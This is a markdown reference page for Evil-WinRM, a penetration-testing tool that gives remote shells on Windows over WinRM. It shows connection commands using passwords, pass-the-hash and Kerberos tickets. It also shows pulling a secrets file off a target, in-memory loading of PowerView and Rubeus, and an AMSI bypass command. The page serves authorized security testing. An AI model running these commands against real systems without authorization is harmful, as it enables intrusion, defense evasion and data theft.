---
tool: evil-winrm
category: remote-access
tags:
  - winrm
  - post-exploitation
  - windows
  - lateral-movement
  - pass-the-hash
  - kerberos
os: windows
protocols:
  - winrm
  - psrp
url: https://github.com/Hackplayers/evil-winrm
---

# Evil-WinRM

The ultimate WinRM shell for penetration testing Windows systems.

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Key Features](#key-features)
- [Documentation](#documentation)

## Overview

Evil-WinRM provides a shell for interacting with Windows systems via Windows Remote Management (WinRM), typically on port 5985/5986. It uses PSRP (PowerShell Remoting Protocol) for command execution and offers advanced features like in-memory script loading, AMSI bypass, and pass-the-hash authentication.

## Installation

### Ruby Gem (Recommended)

```bash
gem install evil-winrm
```

### Docker

```bash
docker pull oscarakaelvis/evil-winrm
```

### From Source

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
sudo gem install winrm winrm-fs stringio logger fileutils
```

## Quick Start

### Basic Connection

```bash
# Password authentication
evil-winrm -i 192.168.1.100 -u Administrator -p 'Password123!'

# Pass-the-hash
evil-winrm -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee

# Kerberos authentication
evil-winrm -i dc01.contoso.com -r CONTOSO.COM -K /tmp/ticket.ccache

# SSL connection
evil-winrm -i 192.168.1.100 -u Administrator -p 'Password123!' -S -P 5986
```

### File Transfer

```bash
# Upload file
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Download file
*Evil-WinRM* PS C:\> download C:\Users\Admin\secrets.txt /local/path/secrets.txt
```

### Loading Scripts and Binaries

```bash
# Start with script and executable paths
evil-winrm -i 192.168.1.100 -u Admin -p Pass -s /opt/scripts/ -e /opt/binaries/

# Load PowerShell script (from -s path)
*Evil-WinRM* PS C:\> PowerView.ps1
*Evil-WinRM* PS C:\> Get-DomainUser

# Execute C# binary in memory (from -e path)
*Evil-WinRM* PS C:\> Invoke-Binary /opt/binaries/Rubeus.exe

# AMSI bypass
*Evil-WinRM* PS C:\> Bypass-4MSI
```

## Key Features

| Feature | Description |
|---------|-------------|
| Pass-the-Hash | Authenticate using NTLM hash instead of password |
| Kerberos Auth | Support for ccache and kirbi ticket files |
| In-Memory Execution | Load PowerShell scripts, DLLs, and C# assemblies without touching disk |
| AMSI Bypass | Dynamic bypass of Windows Defender signatures |
| Donut Loader | Execute x64 shellcode payloads via donut technique |
| File Transfer | Upload/download with progress indication |
| Service Enumeration | List services without admin privileges |
| SSL Support | Connect via HTTPS on port 5986 |
| Command History | Persistent history per host/user combination |
| Tab Completion | Local and remote path auto-completion |

## Documentation

| Document | Description |
|----------|-------------|
| [Features Guide](features.md) | Complete feature documentation with practical examples |
| [Advanced Commands](advanced-commands.md) | Invoke-Binary, Dll-Loader, Donut-Loader usage |
| [Kerberos Authentication](kerberos-authentication.md) | Ticket setup and /etc/krb5.conf configuration |
| [Troubleshooting](troubleshooting.md) | OpenSSL errors, remote path completion fixes |

## Command Reference

```
Usage: evil-winrm -i IP -u USER [-p PASS] [-H HASH] [-s SCRIPTS] [-e EXES]

Authentication:
  -i, --ip IP              Target host IP or FQDN (required)
  -u, --user USER          Username
  -p, --password PASS      Password (omit for prompt)
  -H, --hash HASH          NTLM hash for pass-the-hash
  -r, --realm DOMAIN       Kerberos realm (requires /etc/krb5.conf)
  -K, --ccache FILE        Kerberos ticket file (ccache or kirbi)

Connection:
  -P, --port PORT          Port (default: 5985)
  -S, --ssl                Enable SSL (use with port 5986)
  -c, --pub-key PATH       SSL public key certificate
  -k, --priv-key PATH      SSL private key certificate

Features:
  -s, --scripts PATH       PowerShell scripts directory
  -e, --executables PATH   C# executables directory
  -l, --log                Enable session logging
  -n, --no-colors          Disable colored output
```

## See Also

- [WinRM Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)
- [Impacket](../impacket/README.md) - Alternative remote execution tools
- [CrackMapExec](../crackmapexec/README.md) - Network reconnaissance and execution
